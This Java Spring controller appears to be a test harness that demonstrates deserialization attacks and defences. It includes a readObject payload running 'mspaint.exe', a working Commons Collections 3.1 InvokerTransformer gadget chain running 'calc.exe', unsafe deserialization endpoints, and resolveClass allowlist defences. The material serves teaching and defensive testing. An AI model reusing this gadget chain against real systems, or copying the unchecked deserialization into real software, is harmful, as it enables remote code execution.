package cn.moonlord.test;

import io.swagger.annotations.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import org.springframework.web.bind.annotation.*;

import java.io.*;
import java.util.*;

@Api(tags = "反序列化 测试")
@RestController
@RequestMapping("/Deserialization")
public class DeserializationTestController {

    private static class SimpleObject implements Serializable {
        public String name;
        public SimpleObject(String name) { this.name = name; }
        public String toString(){ return "{\"name\":\"" + name + "\"}"; }
    }

    private static class AttackObject extends SimpleObject implements Serializable {
        public AttackObject(String name) { super(name); }
        private void readObject(ObjectInputStream in) throws Exception {
            in.defaultReadObject();
            Runtime.getRuntime().exec("mspaint.exe");
        }
    }

    private static class MapObject extends SimpleObject implements Serializable {
        public Map map;
        public MapObject(String name, Map map) {
            super(name);
            this.map = map;
        }
        private void readObject(ObjectInputStream in) throws Exception {
            in.defaultReadObject();
            if(map != null && map.size() > 0){
                Map.Entry e = (Map.Entry)map.entrySet().iterator().next();
                e.setValue(name);
            }
        }
    }

    public class SafeObjectInputStream extends ObjectInputStream{

        private Class<?>[] safeClass;

        public SafeObjectInputStream(InputStream inputStream, Class<?> safeClass[]) throws IOException {
            super(inputStream);
            this.safeClass = safeClass;
        }

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            Boolean trusted = false;
            for (int i = 0; i < safeClass.length; i++) {
                if (desc.getName().equals(safeClass[i].getName())) {
                    trusted = true;
                }
            }
            if(!trusted){
                throw new InvalidClassException("Unsafe deserialization attempt has been denied", desc.getName());
            }
            return super.resolveClass(desc);
        }

    }

    private static final String testCaseA1 = "Hello World";

    @ApiOperation(value="测试用例 A1，序列化一个正常对象，并保存到 A1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestA1")
    public String TestA1(@RequestParam String name) throws Exception {
        String fileName = "A1.ser";
        SimpleObject obj = new SimpleObject(name);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 A2，序列化一个实现了 readObject 的对象，并保存到 A1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestA2")
    public String TestA2(@RequestParam String name) throws Exception {
        AttackObject obj = new AttackObject(name);
        String fileName = "A1.ser";
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 A3，从文件 A1.ser 中，反序列化对象（可以执行 readObject 中的代码）")
    @GetMapping(value = "/TestA3")
    public String TestA3() throws Exception {
        String fileName = "A1.ser";
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        SimpleObject obj = (SimpleObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

    @ApiOperation(value="测试用例 A4，继承并重写 ObjectInputStream 的 resolveClass 方法，限制允许反序列化的类，可以防御攻击")
    @GetMapping(value = "/TestA4")
    public String TestA4() throws Exception {
        String fileName = "A1.ser";
        SafeObjectInputStream in = new SafeObjectInputStream(new FileInputStream(fileName), new Class[]{ SimpleObject.class });
        SimpleObject obj = (SimpleObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

    @ApiOperation(value="测试用例 B1，序列化一个含有 Map 的正常对象，并保存到 B1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestB1")
    public String TestB1(@RequestParam String name) throws Exception {
        HashMap hashMap = new HashMap<String, String>();
        hashMap.put("testKey", "testValue");
        MapObject obj = new MapObject(name, hashMap);
        String fileName = "B1.ser";
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 B2，使用 commons-collections 3.1 的 InvokerTransformer，序列化攻击对象，并保存到 B1.ser 文件中")
    @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "对象参数1", example = testCaseA1)})
    @GetMapping(value = "/TestB2")
    public String TestB2(@RequestParam String name) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer("exec",
                        new Class[] {String.class }, new Object[] {"calc.exe"}
                )
        };
        Transformer transformedChain = new ChainedTransformer(transformers);
        Map<String,String> beforeTransformerMap = new HashMap<String,String>();
        beforeTransformerMap.put("testKey", "testValue");
        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
        MapObject obj = new MapObject(name, afterTransformerMap);
        String fileName = "B1.ser";
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(fileName));
        out.writeObject(obj);
        out.close();
        System.out.println("Serialized data is saved in " + fileName);
        return "Serialized data is saved in " + fileName;
    }

    @ApiOperation(value="测试用例 B3，从文件 B1.ser 中，反序列化对象(可以利用 Map 的 setValue 方法，执行 InvokerTransformer 构造的攻击代码)")
    @GetMapping(value = "/TestB3")
    public String TestB3() throws Exception {
        String fileName = "B1.ser";
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(fileName));
        MapObject obj = (MapObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

    @ApiOperation(value="测试用例 B4，继承并重写 ObjectInputStream 的 resolveClass 方法，限制允许反序列化的类，可以防御攻击")
    @GetMapping(value = "/TestB4")
    public String TestB4() throws Exception {
        String fileName = "B1.ser";
        SafeObjectInputStream in = new SafeObjectInputStream(
                new FileInputStream(fileName),
                new Class[]{ SimpleObject.class, MapObject.class, HashMap.class }
        );
        MapObject obj = (MapObject) in.readObject();
        in.close();
        System.out.println("Serialized Object has been read : " + obj);
        return "Serialized Object has been read : " + obj;
    }

}
